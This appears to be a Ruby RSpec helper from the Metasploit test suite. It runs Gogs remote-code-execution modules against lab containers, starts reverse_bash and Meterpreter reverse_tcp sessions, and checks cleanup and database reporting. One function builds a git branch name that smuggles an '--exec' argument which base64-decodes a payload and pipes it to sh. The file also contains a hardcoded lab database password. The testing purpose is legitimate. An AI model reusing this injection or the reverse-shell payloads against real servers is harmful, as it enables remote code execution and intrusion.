# frozen_string_literal: true

require 'base64'
require 'csv'
require 'digest'
require 'English'
require 'timeout'

module Acceptance
  # Native controls, real payload proof and scoped restoration for Gogs profiles.
  module GogsTargetHelpers
    def gogs_native(request)
      argv = ['python3', '-B', 'test/module_targets/gogs/control.py', JSON.generate(request)]
      output, error, status = Open3.capture3(*argv)
      File.open(File.join(target_runtime.fetch('artifacts'), 'native-control-status.jsonl'), 'a') do |log|
        log.puts(JSON.generate(argv: argv, stdout: output, stderr: error, exitstatus: status.exitstatus))
      end
      expect(status.success?).to be(true), "Native #{request.fetch(:action)} failed: #{error}"
      expect(error).to eq('')
      JSON.parse(output)
    end

    def gogs_actor(service)
      gogs_definition.fetch('services').fetch(service).fetch('actor')
    end

    def gogs_state(service)
      gogs_native(action: 'state', service: service)
    end

    def gogs_account(user)
      CSV.read('test/module_targets/gogs/accounts.tsv', headers: true, col_sep: "\t").find { |row| row['username'] == user }.to_h
    end

    def gogs_invoke(service, options = {}, action: 'run -z', negative: false)
      endpoint_name = gogs_definition.fetch('services').fetch(service).fetch('endpoint')
      endpoint = target_runtime.fetch('module_endpoints').fetch(endpoint_name)
      hooks = gogs_profile == 'gogs_hooks'
      name = hooks ? 'gogs_git_hooks_rce' : 'gogs_rebase_rce'
      values = {
        'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port'), 'SSL' => false,
        'USERNAME' => hooks ? 'lab-admin' : 'lab-user',
        'TARGET' => 0, 'PAYLOAD' => 'cmd/unix/generic', 'DisablePayloadHandler' => true,
        'WfsDelay' => 0, 'VERBOSE' => true, 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true
      }
      # The original baseline exposed missing TARGETURI registration. The
      # separate option fix now supplies '/'; exercise that default at root
      # and retain the explicit subpath's strict option and request checks.
      values['TARGETURI'] = service == 'prefix' ? '/gogs/' : '/' if hooks || service == 'prefix'
      values.merge!('EXPLOIT_METHOD' => 'existing_repo', 'REPO_OWNER' => 'lab-admin', 'REPO_NAME' => @seed_name) if @seed_name
      values.merge!(options)
      values['PASSWORD'] = gogs_account(values.fetch('USERNAME')).fetch('password') unless options.key?('PASSWORD')
      console_command('back')
      selected = console_command("use exploit/multi/http/#{name}")
      expect(selected).not_to match(/Failed to load|Unknown command|No results/)
      %w[TARGET PAYLOAD].each do |key|
        configured = console_command("set #{key} #{values.delete(key)}")
        expect(configured).not_to match(/Failed|Invalid|not found/)
      end
      output = console_command("#{action} #{format_datastore_options(values)}", timeout: 120)
      @gogs_last_output = output
      expect(output).not_to match(/\bException\b|Unknown datastore option|undefined method|NoMethodError|Call stack:|Msf::OptionValidateError/i)
      expect(output).not_to include('[-]') unless negative
      output
    end

    def gogs_command(service, options = {}, existing: false, rebase: true)
      2.times do |iteration|
        gogs_with_state(service, iteration, existing: existing, rebase: rebase, user: options.fetch('USERNAME', gogs_profile == 'gogs_hooks' ? 'lab-admin' : 'lab-user')) do |proof|
          output = gogs_invoke(service, { 'CMD' => "printf MODULE_TARGET_GOGS_PROOF>#{proof}" }.merge(options))
          gogs_wait(15) do
            expect(target_exec(gogs_actor(service), 'sh', '-c', "if test -f #{proof}; then cat #{proof}; fi")).to eq('MODULE_TARGET_GOGS_PROOF')
          end
          expect(target_exec(gogs_actor(service), 'stat', '-c', '%u:%g', proof).strip).to eq('1000:1000')
          expect(output).to include('Gogs') if gogs_profile != 'gogs_hooks'
          gogs_verify_reporting(service, exploited: true) unless gogs_profile == 'gogs_hooks'
        end
      end
    end

    def gogs_session(service, payload, target: 0, options: {}, existing: false)
      2.times do |iteration|
        gogs_with_state(service, iteration, existing: existing, user: options.fetch('USERNAME', gogs_profile == 'gogs_hooks' ? 'lab-admin' : 'lab-user')) do |proof|
          # Keep the owner's actual30-second default for genuine session cases.
          output = gogs_invoke(service, {
            'TARGET' => target, 'PAYLOAD' => payload, 'DisablePayloadHandler' => false,
            'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 30
          }.merge(options))
          session_id = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
          expect(session_id).not_to be_nil, output
          gogs_session_proof(service, session_id, payload, proof)
          unless gogs_profile == 'gogs_hooks'
            gogs_wait(15) { gogs_verify_reporting(service, exploited: true, session_id: session_id, payload: payload) }
          end
        end
      end
    end

    def gogs_refused(service, options = {}, existing: false, rebase: true, expected: nil)
      2.times do |iteration|
        user = options.fetch('USERNAME', gogs_profile == 'gogs_hooks' ? 'lab-admin' : 'lab-user')
        gogs_with_state(service, iteration, existing: existing, rebase: rebase, user: user, negative: true) do |proof|
          output = gogs_invoke(service, { 'CMD' => "touch #{proof}" }.merge(options), negative: true)
          expect(output).to include(expected) if expected
          if options['ForceExploit']
            expect(output).to include('Branches pushed', 'Triggering rebase merge')
            expect(output).to match(/PR #\d+ created/)
            expect(output).to match(%r{POST /[^\s]+/pulls/\d+/merge\?merge_style=rebase_before_merging HTTP/})
          end
          expect(output).not_to match(/(?:Command shell|Meterpreter) session \d+ opened/)
          expect(target_exec(gogs_actor(service), 'test', '!', '-e', proof)).to eq('')
          # Capture reporting even if a request-only module reports a vulnerability
          # without execution; do not hide that owner behavior as setup success.
          gogs_verify_reporting(service, exploited: false, observational: options['ForceExploit'] || !rebase) unless gogs_profile == 'gogs_hooks'
        end
      end
    end

    def gogs_with_state(service, iteration, user:, existing: false, rebase: true, negative: false)
      seed_name = "module-target-seed-#{@gogs_case.tr('_', '-')}"
      expect(console_command('sessions -l')).to include('No active sessions')
      expect(console_command('jobs -l')).to include('No active jobs')
      before_seed = gogs_state(service)
      process_baseline = gogs_stable_processes(service, iteration)
      @gogs_iteration = iteration
      @gogs_last_output = nil
      seed = gogs_native(action: 'seed', service: service, name: seed_name, rebase: rebase) if existing
      before = gogs_state(service)
      proof = "/tmp/module-target-gogs-#{@gogs_case}-#{iteration}"
      expect(target_exec(gogs_actor(service), 'test', '!', '-e', proof)).to eq('')
      @seed_name = seed_name if existing
      yield proof
      after = gogs_state(service)
      File.open(File.join(target_runtime.fetch('artifacts'), 'gogs-restoration.jsonl'), 'a') do |log|
        log.puts(JSON.generate(case_id: @gogs_case, iteration: iteration, service: service, seed: seed, before: before,
                               after_module: after, proof: proof, expected_negative: negative, operator_reset_required: existing,
                               existing_repeat_claim: 'Fresh owned seed per iteration; no unchanged-repository repeat claim'))
      end
      if existing
        numbers = @gogs_last_output.to_s.scan(/PR #(\d+) created/).flatten
        if numbers.empty?
          expect(gogs_native(action: 'refs', service: service, owner: 'lab-admin', name: seed_name)).to eq(seed.fetch('refs'))
        else
          expect(numbers.length).to eq(1)
          pull = gogs_native(action: 'pull_state', service: service, owner: 'lab-admin', name: seed_name,
                             number: numbers.first.to_i, seed_refs: seed.fetch('refs'))
          File.open(File.join(target_runtime.fetch('artifacts'), 'gogs-closed-pull-ref.jsonl'), 'a') do |log|
            log.puts(JSON.generate(case_id: @gogs_case, iteration: iteration, service: service, proof: pull))
          end
        end
      else
        expect(after.fetch('tree')).to eq(before.fetch('tree'))
      end
      # Tokens are documented module residue. Require its warning and observe the
      # native UI operator reset separately, never call that automatic cleanup.
      old_ids = before.fetch('tokens').fetch(user).map { |row| row.fetch('id') }
      new_tokens = after.fetch('tokens').fetch(user).reject { |row| old_ids.include?(row.fetch('id')) }
      unless new_tokens.empty?
        expect(new_tokens.length).to eq(1)
        expect(new_tokens.first.fetch('name')).to start_with('msf_')
        expect(@gogs_last_output).to include('API token "msf_*" persists on the target')
      end
      gogs_native(action: 'revoke', service: service, user: user, before: before.fetch('tokens').fetch(user))
      target_exec(gogs_actor(service), 'rm', '-f', proof)
    ensure
      if before
        original_error = $ERROR_INFO
        begin
          after = gogs_state(service)
          File.open(File.join(target_runtime.fetch('artifacts'), 'gogs-finally.jsonl'), 'a') do |log|
            log.puts(JSON.generate(case_id: @gogs_case, iteration: iteration, before: before, after_module: after, original_error: original_error&.message))
          end
          gogs_recover_new_repositories(service, before)
          gogs_native(action: 'revoke', service: service, user: user, before: before.fetch('tokens').fetch(user))
          gogs_native(action: 'remove_repo', service: service, owner: 'lab-admin', name: seed_name) if existing
          target_exec(gogs_actor(service), 'rm', '-f', proof)
          restored = gogs_state(service)
          # Preserve the original identity projection; retain every raw process.
          gogs_wait(15) do
            current = gogs_process_projection(gogs_native(action: 'processes', service: service))
            expect(current).to eq(gogs_process_projection(process_baseline))
          end
          expect(restored.fetch('tree')).to eq(before_seed.fetch('tree'))
          restored.fetch('repositories').each do |owner, repositories|
            expect(repositories.map { |row| row.fetch('id') }).to eq(before_seed.fetch('repositories').fetch(owner).map { |row| row.fetch('id') })
          end
          expect(restored.fetch('framework_tmp')).to eq(before_seed.fetch('framework_tmp'))
          expect(restored.fetch('target_tmp')).to eq(before_seed.fetch('target_tmp'))
        rescue RSpec::Expectations::ExpectationNotMetError, StandardError
          raise unless original_error
        end
      end
      @seed_name = nil
    end

    def gogs_process_projection(rows)
      rows.map { |row| row.split.values_at(0, 1, 3, 4, 21) }
    end

    def gogs_stable_processes(service, iteration)
      observations = []
      baseline = nil
      gogs_wait(15) do
        first = gogs_native(action: 'processes', service: service)
        second = gogs_native(action: 'processes', service: service)
        observations << { first: first, second: second }
        expect(gogs_process_projection(second)).to eq(gogs_process_projection(first))
        baseline = second
      end
      baseline
    ensure
      File.open(File.join(target_runtime.fetch('artifacts'), 'gogs-pre-run-processes.jsonl'), 'a') do |log|
        log.puts(JSON.generate(case_id: @gogs_case, iteration: iteration, service: service, before_module: true,
                               observations: observations, baseline: baseline, excluded_process_names: []))
      end
    end

    def gogs_recover_new_repositories(service, before)
      after = gogs_state(service)
      after.fetch('repositories').each do |owner, repositories|
        old_ids = before.fetch('repositories').fetch(owner).map { |row| row.fetch('id') }
        repositories.each do |repository|
          next if old_ids.include?(repository.fetch('id'))

          destination = File.join(target_runtime.fetch('artifacts'), "repository-#{@gogs_case}-#{repository.fetch('id')}")
          actor = gogs_actor(service)
          path = "/data/git/gogs-repositories/#{owner}/#{repository.fetch('name').downcase}.git"
          copied, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'cp', "#{actor}:#{path}", destination)
          File.write("#{destination}-capture.json", JSON.pretty_generate(stdout: copied, stderr: error, exitstatus: status.exitstatus, repository: repository))
          expect(status.success?).to be(true), error
          gogs_native(action: 'remove_repo', service: service, owner: owner, name: repository.fetch('name'))
        end
      end
    end

    def gogs_wait(seconds)
      failure = nil
      Timeout.timeout(seconds) do
        wait_for_expect(1000, 0.1) do
          yield
        rescue RSpec::Expectations::ExpectationNotMetError => e
          failure = e
          raise
        end
      end
    rescue Timeout::Error
      raise failure || RSpec::Expectations::ExpectationNotMetError.new("Gogs condition exceeded #{seconds} seconds")
    end

    def gogs_session_proof(service, session_id, payload, proof)
      meterpreter = payload.include?('meterpreter')
      if meterpreter
        result = console_command("sessions -i #{session_id} -C getpid")
        pid = result[/Current pid: (\d+)/, 1]
        output = console_command("sessions -i #{session_id} -C #{"execute -f /bin/touch -a #{proof}".inspect}")
      else
        output = console_command("sessions -i #{session_id} -c #{"touch #{proof}; printf 'GOGS_PID=%s\\n' $$".inspect}")
        pid = output[/GOGS_PID=(\d+)/, 1]
      end
      expect(pid).not_to be_nil, output
      expect(output).not_to match(/\[-\]|Exception|Unknown command/)
      gogs_wait(15) { expect(target_exec(gogs_actor(service), 'stat', '-c', '%u:%g', proof).strip).to eq('1000:1000') }
      process = target_exec(gogs_actor(service), 'cat', "/proc/#{pid}/status")
      expect(process).to match(/^Uid:\s+1000\s+1000\s+1000\s+1000$/)
      shutdown = meterpreter ? "framework.sessions[#{session_id}].exit" : "framework.sessions[#{session_id}].shell_write(\"exit\\n\")"
      console_command("irb -e #{shutdown.inspect}")
      gogs_wait(15) { expect(target_exec(gogs_actor(service), 'sh', '-c', "if test -e /proc/#{pid}; then printf PRESENT; else printf ABSENT; fi")).to eq('ABSENT') }
      # Explicit operator host-session cleanup follows the native target exit proof.
      console_command("irb -e #{"framework.sessions[#{session_id}]&.shell_close".inspect}") unless meterpreter
      gogs_wait(15) { expect(console_command('sessions -l')).to include('No active sessions') }
    end

    def calibrate_native_payload(service, payload, format)
      artifact = File.join(target_runtime.fetch('artifacts'), "native-#{service}-#{format}")
      console_command('back')
      console_command("use payload/#{payload}")
      console_command("set LHOST #{listener_host}")
      console_command('set LPORT 4444')
      generated = console_command("generate -f #{format} -o #{artifact}")
      expect(generated).not_to match(/\[-\]|Exception|Unknown command/)
      bytes = File.binread(artifact)
      expect(bytes).not_to be_empty
      expect(bytes).to start_with("\x7fELF") if format == 'elf'
      console_command('back')
      console_command('use exploit/multi/handler')
      console_command("set PAYLOAD #{payload}")
      console_command("set LHOST #{listener_host}")
      console_command('set LPORT 4444')
      console_command('set ExitOnSession false')
      expect(console_command('run -j')).not_to include('[-]')
      gogs_wait(15) { expect(gogs_listener_rows).not_to be_empty }
      remote = "/tmp/module-target-native-#{format}"
      _output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'cp', artifact, "#{gogs_actor(service)}:#{remote}")
      expect(status.success?).to be(true), error
      target_exec(gogs_actor(service), 'chmod', '755', remote)
      gogs_native_ref_format(bytes) if format == 'raw' && gogs_profile != 'gogs_hooks'
      arguments = format == 'elf' ? [remote] : ['/bin/bash', remote]
      _output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', '-d', '--user', 'git', gogs_actor(service), *arguments)
      expect(status.success?).to be(true), error
      opened = nil
      gogs_wait(15) do
        rows = console_command('sessions -l')
        opened = rows[/^\s*(\d+)\s+.*\b#{payload.include?('meterpreter') ? 'meterpreter' : 'shell'}\b/i, 1]
        expect(opened).not_to be_nil, rows
        # Registration precedes bootstrap; use the native Linux helper's gate.
        label = payload.include?('meterpreter') ? 'Meterpreter' : 'Command shell'
        expect(console.all_data).to include("#{label} session #{opened} opened")
      end
      proof = "/tmp/module-target-native-#{service}-proof"
      gogs_session_proof(service, opened, payload, proof)
      File.open(File.join(target_runtime.fetch('artifacts'), 'native-payload-calibration.jsonl'), 'a') do |log|
        log.puts(JSON.generate(service: service, payload: payload, format: format, bytes: bytes.bytesize, sha256: Digest::SHA256.hexdigest(bytes), session: opened))
      end
      target_exec(gogs_actor(service), 'rm', '-f', proof, remote)
      console_command('jobs -K')
      gogs_listeners_absent
    end

    def gogs_native_ref_format(bytes)
      wrapped = "(#{bytes}) </dev/null >/dev/null 2>&1 &"
      encoded = Base64.strict_encode64(wrapped)
      50.times do |index|
        break unless encoded.include?('//')

        encoded = Base64.strict_encode64(' ' * (index + 1) + wrapped)
      end
      branch = "--exec=echo${IFS}#{encoded}|base64${IFS}-d|sh"
      expect(branch.split('/').map(&:bytesize).max).to be <= 255
      expect(target_exec('framework', 'git', 'check-ref-format', "refs/heads/#{branch}")).to eq('')
      File.write(File.join(target_runtime.fetch('artifacts'), 'native-payload-ref.json'), JSON.pretty_generate(branch: branch, bytes: branch.bytesize, payload_sha256: Digest::SHA256.hexdigest(bytes)))
    end

    def gogs_listener_rows
      script = 'require "json";rows=%w[/proc/net/tcp /proc/net/tcp6].flat_map { |p| File.readlines(p).drop(1).map(&:split) };puts JSON.generate(rows.select { |r| r[3]=="0A" && r[1].split(":").last.to_i(16)==4444 })'
      JSON.parse(target_exec('framework', 'ruby', '-e', script))
    end

    def gogs_listeners_absent
      gogs_wait(15) { expect(gogs_listener_rows).to eq([]) }
    end

    def gogs_sql(statement)
      output, error, status = Open3.capture3(*target_runtime.fetch('compose'), 'exec', '-T', 'reporting_db', 'psql', '-U', 'module_framework', '-d', 'module_targets', '-At', '-c', statement)
      File.open(File.join(target_runtime.fetch('artifacts'), 'gogs-sql.jsonl'), 'a') do |log|
        log.puts(JSON.generate(statement: statement, stdout: output, stderr: error, exitstatus: status.exitstatus))
      end
      expect(status.success?).to be(true), error
      expect(error).to eq('')
      output
    end

    def gogs_reporting
      services = JSON.parse(gogs_sql("SELECT COALESCE(json_agg(row),'[]') FROM (SELECT s.id,host(h.address) AS address,s.port,s.proto,s.name,s.info,s.resource FROM services s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY s.name,s.id) row"))
      vulns = JSON.parse(gogs_sql("SELECT COALESCE(json_agg(row),'[]') FROM (SELECT v.id,v.name,v.info,v.service_id,host(h.address) AS address FROM vulns v JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY v.id) row"))
      links = JSON.parse(gogs_sql("SELECT COALESCE(json_agg(row),'[]') FROM (SELECT c.name AS child,p.name AS parent FROM service_links l JOIN services c ON c.id=l.child_id JOIN services p ON p.id=l.parent_id JOIN hosts h ON h.id=c.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY c.name,p.name) row"))
      { services: services, vulnerabilities: vulns, links: links }
    end

    def gogs_reporting_provenance
      references = JSON.parse(gogs_sql("SELECT COALESCE(json_agg(row),'[]') FROM (SELECT v.id AS vuln_id,r.name FROM vulns v JOIN vulns_refs vr ON vr.vuln_id=v.id JOIN refs r ON r.id=vr.ref_id JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY v.id,r.name) row"))
      sessions = JSON.parse(gogs_sql("SELECT COALESCE(json_agg(row),'[]') FROM (SELECT s.id,s.local_id,s.stype,s.via_exploit,s.via_payload,s.closed_at,host(h.address) AS address FROM sessions s JOIN hosts h ON h.id=s.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY s.id) row"))
      attempts = JSON.parse(gogs_sql("SELECT COALESCE(json_agg(row),'[]') FROM (SELECT e.module,e.session_id,e.vuln_id,e.exploited FROM exploit_attempts e JOIN hosts h ON h.id=e.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY e.id) row"))
      checks = JSON.parse(gogs_sql("SELECT COALESCE(json_agg(row),'[]') FROM (SELECT a.module,a.vuln_id,a.check_code,a.check_detail FROM vuln_attempts a JOIN vulns v ON v.id=a.vuln_id JOIN hosts h ON h.id=v.host_id JOIN workspaces w ON w.id=h.workspace_id WHERE w.name='#{@workspace}' ORDER BY a.id) row"))
      { references: references, sessions: sessions, attempts: attempts, checks: checks }
    end

    def gogs_verify_reporting(service, exploited:, observational: false, session_id: nil, payload: nil)
      report = gogs_reporting
      provenance = gogs_reporting_provenance
      File.open(File.join(target_runtime.fetch('artifacts'), 'gogs-reporting-provenance.jsonl'), 'a') do |log|
        log.puts(JSON.generate(case_id: @gogs_case, iteration: @gogs_iteration, service: service, marker_or_session_proved: exploited,
                               observational: observational, console_session: session_id, graph: report, provenance: provenance))
      end
      endpoint = target_runtime.fetch('module_endpoints').fetch(gogs_definition.fetch('services').fetch(service).fetch('endpoint'))
      if exploited || !report.fetch(:services).empty?
        expect(report.fetch(:services).map { |row| row.fetch('name') }.sort).to eq(%w[gogs http tcp])
        expect(report.fetch(:links)).to eq([{ 'child' => 'gogs', 'parent' => 'http' }, { 'child' => 'http', 'parent' => 'tcp' }])
        report.fetch(:services).each { |row| expect(row.values_at('address', 'port', 'proto')).to eq([endpoint.fetch('host'), endpoint.fetch('port'), 'tcp']) }
      end
      passive = gogs_profile == 'gogs_rebase'
      explicit_fixed = gogs_profile == 'gogs_rebase_fixed' && observational
      expected_name = @gogs_owner_meta.fetch('name')
      expected_fullname = @gogs_owner_meta.fetch('fullname')
      gogs_service = report.fetch(:services).find { |row| row.fetch('name') == 'gogs' }
      http_service = report.fetch(:services).find { |row| row.fetch('name') == 'http' }
      expected = []
      if passive
        expected << [expected_fullname, @gogs_owner_meta.fetch('description'), gogs_service.fetch('id')]
      elsif explicit_fixed
        # Forced requests on a Safe release reach the owner's explicit report;
        # this is request evidence only, never a marker/session assertion.
        expected << [expected_name, 'Exploited via own_repo method', gogs_service.fetch('id')]
      end
      if session_id
        persisted = provenance.fetch(:sessions)
        expect(persisted.length).to eq(@gogs_iteration + 1)
        persisted.each do |row|
          expect(row.values_at('via_exploit', 'via_payload', 'stype', 'address')).to eq([expected_fullname, "payload/#{payload}", 'shell', endpoint.fetch('host')])
          expect(row.fetch('closed_at')).not_to be_nil
        end
        actual = persisted.find { |row| row.fetch('local_id').to_s == session_id.to_s }
        expect(actual).not_to be_nil
        inferred = report.fetch(:vulnerabilities).find { |row| row.fetch('name') == expected_name && row.fetch('service_id') == http_service.fetch('id') }
        expect(inferred).not_to be_nil
        db_id = inferred.fetch('info')[/\AExploited by #{Regexp.escape(expected_fullname)} to create Session (\d+)\z/, 1]
        expect(persisted.map { |row| row.fetch('id').to_s }).to include(db_id)
        persisted.each do |row|
          expect(provenance.fetch(:attempts)).to include(hash_including('module' => expected_fullname, 'session_id' => row.fetch('id'),
                                                                        'vuln_id' => inferred.fetch('id'), 'exploited' => true))
        end
        expected << [expected_name, inferred.fetch('info'), http_service.fetch('id')]
      else
        expect(provenance.fetch(:sessions)).to eq([])
      end
      rows = report.fetch(:vulnerabilities)
      expect(rows.map { |row| row.values_at('name', 'info', 'service_id') }).to match_array(expected)
      expected_refs = @gogs_owner_meta.fetch('references').map { |identifier, value| "#{identifier}-#{value}" }.uniq.sort
      expect(expected_refs.grep(/\ACVE-/)).not_to be_empty
      rows.each do |row|
        expect(row.fetch('address')).to eq(endpoint.fetch('host'))
        references = provenance.fetch(:references).select { |ref| ref.fetch('vuln_id') == row.fetch('id') }.map { |ref| ref.fetch('name') }
        expect(references.sort).to eq(expected_refs)
      end
      provenance.fetch(:attempts).each do |attempt|
        expect(attempt.fetch('module')).to eq(expected_fullname)
        expect([nil] + rows.map { |row| row.fetch('id') }).to include(attempt.fetch('vuln_id'))
        expect([nil] + provenance.fetch(:sessions).map { |row| row.fetch('id') }).to include(attempt.fetch('session_id'))
      end
      if passive
        discovery = rows.find { |row| row.fetch('name') == expected_fullname }
        expect(provenance.fetch(:checks)).to include(hash_including('module' => expected_fullname, 'vuln_id' => discovery.fetch('id'),
                                                                    'check_code' => 'appears', 'check_detail' => 'Gogs 0.14.2 detected, fixed in 0.14.3.'))
      end
      report
    end
  end
end

RSpec.shared_context 'Gogs target' do
  include Acceptance::GogsTargetHelpers
  include_context 'module target'
  include_context 'wait_for_expect'

  let_it_be(:gogs_profile) { ENV.fetch('GOGS_TARGET_PROFILE') }
  let_it_be(:gogs_definition) { JSON.parse(File.read("test/module_targets/#{gogs_profile}/profile.json")) }

  before(:all) do
    argv = ['python3', '-B', 'test/module_targets/gogs/native_probe.py']
    output, error, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-probe-status.json'), JSON.pretty_generate(argv: argv, stdout: output, stderr: error, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), error
    expect(error).to eq('')
    @native = JSON.parse(output)
    if gogs_profile == 'gogs_hooks'
      calibrate_native_payload('prefix', 'linux/x64/meterpreter/reverse_tcp', 'elf')
      calibrate_native_payload('legacy', 'cmd/unix/reverse_bash', 'raw')
    else
      calibrate_native_payload('gogs', 'cmd/unix/reverse_bash', 'raw')
      expect(console_command('db_connect module_framework:module-target-framework-db-password@reporting_db:5432/module_targets', timeout: 120)).not_to match(/Error|Exception|\[-\]/)
      expect(console_command('db_status')).to include('Connected to module_targets. Connection type: postgresql.')
      File.write(File.join(target_runtime.fetch('artifacts'), 'native-reporting-schema.txt'), gogs_sql("SELECT table_name,column_name,data_type FROM information_schema.columns WHERE table_schema='public' ORDER BY table_name,ordinal_position"))
      metadata_command = 'm=framework.modules.create("exploit/multi/http/gogs_rebase_rce");puts "GOGS_OWNER_META="+{fullname:m.fullname,name:m.name,description:m.description.strip,references:m.references.map { |r| [r.ctx_id,r.ctx_val] },workspace:framework.db.workspace.name}.to_json'
      metadata = console_command("irb -e #{metadata_command.inspect}")
      @gogs_owner_meta = JSON.parse(metadata[/^GOGS_OWNER_META=(\{.*\})\r?$/, 1] || '{}')
      expect(@gogs_owner_meta.fetch('fullname')).to eq('exploit/multi/http/gogs_rebase_rce')
      @workspace = @gogs_owner_meta.fetch('workspace')
      expect(@workspace).not_to be_empty
      File.write(File.join(target_runtime.fetch('artifacts'), 'native-owner-reporting-metadata.json'), JSON.pretty_generate(@gogs_owner_meta))
      graph = gogs_reporting
      provenance = gogs_reporting_provenance
      expect(graph.values).to eq([[], [], []])
      expect(provenance.values).to eq([[], [], [], []])
      File.write(File.join(target_runtime.fetch('artifacts'), 'native-reporting-empty-graph.json'),
                 JSON.pretty_generate(workspace: @workspace, graph: graph, provenance: provenance))
    end
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-calibration-console.log'), console.all_data)
  end

  before do |example|
    @gogs_case = example.metadata.fetch(:scoped_id).tr(':', '_')
    expect(console_command('sessions -l')).to include('No active sessions')
    expect(console_command('jobs -l')).to include('No active jobs')
    if gogs_profile != 'gogs_hooks'
      @workspace = "gogs_#{gogs_profile}_#{@gogs_case}"
      expect(console_command("workspace -a #{@workspace}")).not_to include('[-]')
    end
  end

  after do
    if @workspace
      File.write(File.join(target_runtime.fetch('artifacts'), "reporting-#{@workspace}.json"), JSON.pretty_generate(gogs_reporting))
    end
    expect(console_command('sessions -K')).not_to match(/Exception|Unknown command/)
    expect(console_command('jobs -K')).not_to match(/Exception|Unknown command/)
    gogs_listeners_absent
  end
end
